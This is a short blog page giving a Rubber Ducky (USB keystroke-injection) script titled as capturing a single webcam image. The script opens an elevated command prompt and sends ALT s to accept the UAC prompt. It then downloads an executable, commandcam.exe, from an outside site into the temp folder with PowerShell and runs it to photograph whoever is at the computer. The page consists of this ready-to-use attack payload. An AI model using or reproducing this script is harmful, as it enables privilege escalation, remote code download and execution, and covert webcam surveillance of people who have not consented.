# Capture a single image from a webcam
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/06/22/capture-a-single-image-from-a-webcam/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
STRING powershell Start-BitsTransfer -Source ‘https://www.jesusninoc.com/wp-content/uploads/2015/06/commandcam.exe’ -Destination $env:TEMP\commandcam.exe;
ENTER
DELAY 100
GUI r
DELAY 2050
STRING powershell cd $env:TEMP; .\commandcam.exe /filename capture.bmp
ENTER

```
